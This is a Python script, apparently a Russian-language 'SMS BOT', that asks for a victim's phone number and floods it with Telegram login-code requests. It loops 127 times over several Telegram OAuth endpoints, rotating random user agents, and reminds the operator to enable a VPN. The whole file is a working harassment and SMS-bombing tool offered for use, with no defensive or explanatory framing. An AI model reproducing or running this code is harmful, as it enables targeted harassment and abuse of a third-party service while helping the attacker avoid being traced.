from fake_useragent import UserAgent
import requests
import random
from termcolor import colored
import pyfiglet
import socket
import datetime
import re
import os
import time


def generate_phone_number():
    
    country_codes = ['+7']
    
    
    country_code = random.choice(country_codes)
    
    srv = ['927', '937', '993', '952', '950', '926', '918']
    
    srv_code = random.choice(srv)
    
    phone_number = ''.join(random.choices('0123456789', k=7))
    
  
    formatted_phone_number = f'{country_code}{srv_code}{phone_number}'
    
    return formatted_phone_number

import string

def generate_random_email():
   
	  
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "mail.ru"]
    
    username = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))  
    domain = random.choice(domains) 
    
    email = f"{username}@{domain}"  
    
    return email
    
banner = pyfiglet.figlet_format("SMS BOT")
color_banner = colored(banner, color = 'red')




  



def complaint():
	print(color_banner)
	print()
	print()
	print(colored("Сделал @kabakui","red"))
	print()
	print(colored("[1] Флуд кодами","blue"))
	print()
	print()
	complaint_choice = input(colored("Menu ~>", "green"))

	
	if complaint_choice in ["1"]:
        
		number = int(input(colored("(НЕ ЗАБУДЬ ВРУБИТЬ VPN!) Номер: ", "red")))

		try:
			for _ in range(127):
				user = UserAgent().random
				headers = {'user-agent': user}


				requests.post('https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin', headers=headers, data={'phone': number})
				requests.post('https://translations.telegram.org/auth/request', headers=headers, data={'phone': number})
				requests.post('https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1', headers=headers, data={'phone': number}) 
				requests.post('https://oauth.telegram.org/auth/login?bot_id=366357143&origin=https%3A%2F%2Fwww.botobot.ru&embed=1&request_access=write&lang=ru&return_to=https%3A%2F%2Fwww.botobot.ru%2F, ', headers=headers, data={'phone': number})  
				requests.post('https://oauth.telegram.org/auth/login?bot_id=547043436&origin=https%3A%2F%2Fcore.telegram.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcore.telegram.org%2Fwidgets%2Flogin, ', headers=headers, data={'phone': number})
				requests.post('https://oauth.telegram.org/auth/login?bot_id=7131017560&origin=https%3A%2F%2Flolz.live%2F, ', headers=headers, data={'phone': number})  
				requests.post('https://oauth.telegram.org/auth/login?bot_id=7131017560&origin=https%3A%2F%2Flolz.live%2F, ', headers=headers, data={'phone': number})  
				print("!SPAM!")
		except Exception as e:
			print(e)

        
complaint()